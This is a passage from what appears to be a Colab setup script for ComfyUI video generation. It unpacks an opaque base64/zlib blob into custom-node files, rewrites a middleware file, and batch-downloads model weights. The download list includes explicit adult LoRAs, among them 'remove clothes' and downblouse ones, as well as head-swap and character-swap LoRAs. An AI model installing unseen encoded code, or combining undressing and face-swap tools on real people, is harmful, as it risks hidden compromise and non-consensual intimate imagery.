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"
for _rel_p, _content in json.loads(zlib.decompress(base64.b64decode(ROBOT_NATIVE_B64)).decode("utf-8")).items():
    _dst_p = os.path.join("/content/ComfyUI/custom_nodes", _rel_p)
    os.makedirs(os.path.dirname(_dst_p), exist_ok=True)
    with open(_dst_p, "w", encoding="utf-8") as _f:
        _f.write(_content)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
os.makedirs("/content/ComfyUI/custom_nodes/ComfyUI-TextCompat", exist_ok=True)
with open("/content/ComfyUI/custom_nodes/ComfyUI-TextCompat/__init__.py", "w", encoding="utf-8") as _tf:
    _tf.write("""class TextCompatNode:
    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {"text": ("STRING", {"multiline": True, "default": ""})}}
    RETURN_TYPES = ("STRING",)
    RETURN_NAMES = ("string",)
    FUNCTION = "execute"
    CATEGORY = "utils"
    def execute(self, text=""):
        return (text,)
NODE_CLASS_MAPPINGS = {"Text": TextCompatNode}
NODE_DISPLAY_NAME_MAPPINGS = {"Text": "Text (Multiline)"}
""")

print(f"🎞️ [3/4] 正在多路并发下载音视频 VAE、潜空间放大器与 H3 专属 LoRA 池 (已耗时 {int(time.time()-t0)}s)...")
lora_dir = "/content/lora_pool_h3"
for _d in ["/content/ComfyUI/models/vae", "/content/ComfyUI/models/latent_upscale_models", "/content/ComfyUI/models/vae_approx", "/content/ComfyUI/models/ultralytics/bbox", lora_dir]:
    os.makedirs(_d, exist_ok=True)

batch_items = [
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/vae/minimax_h3_video_vae_fp16.safetensors", "/content/ComfyUI/models/vae", "minimax_h3_video_vae_fp16.safetensors"),
    ('https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/vae/qwen_image_2.1_vae_bf16.safetensors', '/content/ComfyUI/models/vae', '【专用图像VAE-千问2.1】qwen_image_2.1_vae_bf16.safetensors'),
    ("https://huggingface.co/speach1sdef178/MiniMax-H3-X2-Detail-VAE/resolve/main/MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors", "/content/ComfyUI/models/vae", "【2倍超分细节增强VAE】MiniMax-H3-X2-Detail-v1_int8_convrot.safetensors"),
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/vae/minimax_h3_audio_vae_fp32.safetensors", "/content/ComfyUI/models/vae", "minimax_h3_audio_vae_fp32.safetensors"),
    ("https://huggingface.co/LBH-123-AI/Minimax_h3_latent_Upscaler/resolve/main/minimax_h3_latent_upscaler_3d_conv_v1/minimax_h3_latent_upscaler_3d_conv_v1_bf16.safetensors", "/content/ComfyUI/models/latent_upscale_models", "minimax_h3_latent_upscaler_3d_bf16.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/latent_upscaler/h3_upscaler_lms_v0.1.safetensors", "/content/ComfyUI/models/latent_upscale_models", "h3_upscaler_lms_v0.1.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/vae_approx/taeh3.safetensors", "/content/ComfyUI/models/vae_approx", "taeh3.safetensors"),
    ("https://huggingface.co/Bingsu/adetailer/resolve/main/face_yolov8m.pt", "/content/ComfyUI/models/ultralytics/bbox", "face_yolov8m.pt"),
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/minimax_h3_fl2v_turbo_8step_v1.0_comfyui_bf16.safetensors", lora_dir, "【8步加速LoRA-文生图生】minimax_h3_fl2v_turbo_8step.safetensors"),
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_ref2va_v1_bf16.safetensors", lora_dir, "【6步极速-Pika_H3_Flex官方多参版】pika_h3_flex_ref2va_v1_bf16.safetensors"),
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/pika_h3_flex_fl2va_v1_bf16.safetensors", lora_dir, "【6步极速-Pika_H3_Flex官方首尾帧版】pika_h3_flex_fl2va_v1_bf16.safetensors"),
    ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_ref2va_v1_avg_rank_55_bf16.safetensors", lora_dir, "【6步极速-Pika_H3_Flex轻量多参版】pika_h3_flex_ref2va_kijai_bf16.safetensors"),
    ("https://huggingface.co/Kijai/MiniMax-H3_comfy/resolve/main/loras/Pika/pika_h3_flex_fl2va_v1_avg_rank_56_bf16.safetensors", lora_dir, "【6步极速-Pika_H3_Flex轻量首尾帧版】pika_h3_flex_fl2va_kijai_bf16.safetensors"),
    ("https://huggingface.co/Kijai/MiniMax-H3-experimental/resolve/main/loras/minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors", lora_dir, "【2K超清重绘精修LoRA-OpenRegen】minimax_h3_open_regenerate_2k_refiner_rank_16_bf16.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_character_swap_v1.1_ref2va_fro.safetensors", lora_dir, "【视频换人角色替换LoRA-Alisson】minimax_h3_character_swap_v1.1_ref2va_fro.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_head_swap_v1.0_r32.safetensors", lora_dir, "【视频换头换脸LoRA-Alisson】minimax_h3_head_swap_v1.0_r32.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/loras/minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors", lora_dir, "【视频动作迁移跳舞LoRA-Alisson】minimax_h3_motion_transfer_ffp_v1.0_ref2va.safetensors"),
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/minimax_h3_ref2v_turbo_4step_v0.1_comfyui_bf16.safetensors", lora_dir, "【4步加速LoRA-全能参考】minimax_h3_ref2v_turbo_4step.safetensors"),
    ("https://huggingface.co/RunningHubAI/rh-minimax-h3v0.1-feihouremix-v0.6-compat-v001.safetensors-lora/resolve/main/Minimax%20H3%E7%9C%9F%E5%AE%9E%E7%94%B5%E5%BD%B1%E8%B4%A8%E6%84%9FV0.1_FeiHouRemix_v0.6_compat_v001_T8.safetensors", lora_dir, "【电影质感LoRA】Minimax_H3_Cinema_v0.1.safetensors"),
    ("https://huggingface.co/pablodawson/MiniMax-H3-360-Orbit-LoRA/resolve/main/minimax_h3_flf2v_lora_v1.safetensors", lora_dir, "【360度环绕运镜LoRA】minimax_h3_flf2v_lora_v1.safetensors"),
    ("https://huggingface.co/HAOOOOOOO51/Minimax_h3_fl2v_lightx2v_turbo_4to8step_v0.1-v1.0_768p_v4_step600_dareties_fro095_pruned/resolve/main/minimax_h3_fl2v_lightx2v_turbo_4to8step_v0.1-v1.0_768p_v4_step600_dareties_fro095_pruned.safetensors", lora_dir, "【4步8步极速加速LoRA】minimax_h3_dmad_full_dareties_v4_step600_comfy_fro.safetensors"),
    ("https://huggingface.co/JOKER141/MiniMax-H3-Combat-Base-V2/resolve/main/H3_Combat_V2.safetensors", lora_dir, "【C站增强-武打动作增强V2】H3_Combat_V2.safetensors"),
    ("https://huggingface.co/JOKER141/MiniMax-H3-General-Motion-Continuity-Repair/resolve/main/Motion_Repair_V2.safetensors", lora_dir, "【C站增强-动作防崩坏修复V2】Motion_Repair_V2.safetensors"),
    ("https://huggingface.co/JOKER141/H3-Fight-Flow-Fight-Interaction-LoRA/resolve/main/H3_Fight_Flow_V1.safetensors", lora_dir, "【C站增强-格斗连招丝滑流畅】H3_Fight_Flow_V1.safetensors"),
]

aria_lines = []
for url, ddir, fname in batch_items:
    out_p = os.path.join(ddir, fname)
    if not os.path.exists(out_p) or os.path.getsize(out_p) < 100 * 1024:
        aria_lines.append(f"{url}\n  dir={ddir}\n  out={fname}")

if aria_lines:
    with open("/tmp/cell1_dl.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(aria_lines) + "\n")
    subprocess.run(["aria2c", "-i", "/tmp/cell1_dl.txt", "-c", "-j", "8", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=warn", "--summary-interval=0", "--user-agent=Mozilla/5.0"], check=False)

civitai_loras = [
    ("【H3-C站大人解锁V2.1】Minimax_H3_Unlocked_V2.1.safetensors", f"https://civitai.com/api/download/models/3413468?fileId=3305979&token={C站_API_Token}"),
    ("【H3-C站大人-女性特写动作V1】H3_Female_Action_V1.safetensors", f"https://civitai.com/api/download/models/3399711?fileId=3290118&token={C站_API_Token}"),
    ("【H3-C站大人-去衣动作V1.1】H3_Remove_Clothes_V1.1.safetensors", f"https://civitai.com/api/download/models/3394502?fileId=3284268&token={C站_API_Token}"),
    ("【H3-C站大人-全能互动AIO_V2.5】H3_AIO_Interaction_V2.5.safetensors", f"https://civitai.com/api/download/models/3268303?fileId=3152083&token={C站_API_Token}"),
    ("【H3-C站大人-全能互动AIO_V2】H3_AIO_Interaction_V2.safetensors", f"https://civitai.com/api/download/models/3206518?fileId=3088013&token={C站_API_Token}"),
    ("【H3-C站大人-双人互动增强V5_全参】Mystic_MMH3_V5_Ref2VA.safetensors", f"https://civitai.com/api/download/models/3416478?fileId=3311427&token={C站_API_Token}"),
    ("【C站成人-传教士姿势增强V1】MISSIONLG_H3_v1.safetensors", f"https://civitai.com/api/download/models/3403761?fileId=3294817&token={C站_API_Token}"),
    ("【H3-C站大人-亲密互动特写V1】H3_Close_Interaction_V1.safetensors", f"https://civitai.com/api/download/models/3420786?fileId=3314770&token={C站_API_Token}"),
    ("【H3-C站大人-身材细节增强V1】H3_Body_Detail_V1.safetensors", f"https://civitai.com/api/download/models/3404369?fileId=3295540&token={C站_API_Token}"),
    ("【H3-C站大人-丰满曲线增强V0.3】H3_Curvy_Helper_V0.3.safetensors", f"https://civitai.com/api/download/models/3237012?fileId=3119472&token={C站_API_Token}"),
    ("【H3-C站大人-俯视领口走光增强V1】Down_blouse_101-h3.safetensors", f"https://civitai.com/api/download/models/3402446?fileId=3293205&token={C站_API_Token}"),
    ("【H3-C站大人-抓头发互动动作V1】hair_pulling_h3_101.safetensors", f"https://civitai.com/api/download/models/3426349?fileId=3321345&token={C站_API_Token}"),
    ("【H3-C站大人-快慢动作极限滑块V2】PornMaster_MMH3_Fast_motion_slider_V2.safetensors", f"https://civitai.com/api/download/models/3408385?fileId=3300137&token={C站_API_Token}"),
    ("【4步加速LoRA-Turbo社区版】minimax_h3_turbo_v4_step600_pruned_comfyui.safetensors", f"https://civitai.com/api/download/models/3202732?fileId=3091422&token={C站_API_Token}"),
    ("【慢动作丝滑同步LoRA】SSS_Rank_MiniMax_H3_Smooth_Slow_Sync.safetensors", f"https://civitai.com/api/download/models/3384273?fileId=3273015&token={C站_API_Token}"),
    ("【真人皮肤去油光LoRA】MMH3_RealismSlider_V1.safetensors", f"https://civitai.com/api/download/models/3421124?fileId=3315156&token={C站_API_Token}"),
    ("【细节锐化增强LoRA】MMH3_DetailSlider_V1.safetensors", f"https://civitai.com/api/download/models/3314964?fileId=3200403&token={C站_API_Token}"),
    ("【动作速度调节LoRA】MMH3_ActionSpeedSlider_V1.safetensors", f"https://civitai.com/api/download/models/3409409?fileId=3301293&token={C站_API_Token}"),
    ("【C站增强-动作快慢速率滑块】H3_speed_slider_1.1.safetensors", f"https://civitai.com/api/download/models/3389300?fileId=3278497&token={C站_API_Token}"),
]
def _dl_civ(item):
